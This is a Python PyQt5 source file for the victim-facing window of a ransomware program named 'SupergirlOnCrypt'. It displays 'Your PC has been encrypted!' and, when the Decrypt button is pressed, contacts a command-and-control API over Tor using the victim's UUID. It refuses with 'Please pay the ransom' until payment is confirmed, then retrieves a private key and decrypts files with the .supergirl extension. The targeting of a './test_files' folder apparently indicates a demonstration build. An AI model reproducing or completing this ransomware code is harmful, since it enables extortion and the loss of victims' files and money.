from PyQt5 import QtCore
from PyQt5.QtCore import QSize
from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox
from Helper import Helper
from TorManager import TorManager
import Config
import json
import base64
from pathlib import Path
from FileCrypter import FileCrypter


class GUI(QWidget):
    def __init__(self, uuid):
        self.uuid = uuid
        QWidget.__init__(self)
        self.headerFont = QFont("Times", 25, QFont.AllUppercase)
        self.setup()

    def setup(self):
        self.resize(800, 600)
        self.setWindowTitle("SupergirlOnCrypt")
        self.setWindowFlags(self.windowFlags() | QtCore.Qt.CustomizeWindowHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMaximizeButtonHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMinimizeButtonHint)
        self.setbg()
        self.placeWidgets()
        self.show()

    def setbg(self):
        h = Helper()
        oImage = QImage(h.path("res/gui_bg.jpg"))
        sImage = oImage.scaled(QSize(800, 600))  # resize Image to widgets size
        palette = QPalette()
        palette.setBrush(10, QBrush(sImage))  # 10 = Windowrole
        self.setPalette(palette)

    def placeWidgets(self):
        #heading
        self.lbHeader = QLabel("Your PC has been encrypted!", self)
        self.lbHeader.setFont(self.headerFont)
        self.lbHeader.setStyleSheet("QLabel { color: white;}")
        self.lbHeader.setGeometry(190, 10, 500, 50)

        #button decrypt
        self.btnDecrypt = QPushButton("Decrypt", self)
        self.btnDecrypt.move(650, 550)
        self.btnDecrypt.setStyleSheet("QPushButton {background-color:black; color: white; width:100px; height:24px;} "
                                      "QPushButton:hover {color:green;}")
        self.btnDecrypt.clicked.connect(self.decryptData)

    def decryptData(self):
        tor = TorManager()
        r = tor.getSession()
        req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
        data = json.loads(req.text)
        if data['STATUS'] == "FAIL":
            QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
        elif data['STATUS'] == "SUCCESS":
            privkey = base64.b64decode(data['priv_key']).decode('utf-8')
            pathlist = Path('./test_files').glob('**/*.supergirl')
            not_encrypted = []
            h = Helper()
            for path in pathlist:
                path_in_str = str(path)
                fc = FileCrypter()
                try:
                    fc.decrypt_file(path_in_str, privkey)
                    h.info("Decrypted " + path_in_str)
                except IOError:
                    not_encrypted.append(path_in_str)
                    h.error("Could not decrypt " + path_in_str)
            if len(not_encrypted) > 0:
                QMessageBox.question(self, "Error", "Files: " + str(not_encrypted) + " could not be decrypted", QMessageBox.Ok)
            else:
                QMessageBox.question(self, "Something happend", "All Files have been successfully decrypted!", QMessageBox.Ok)
            import sys
            sys.exit()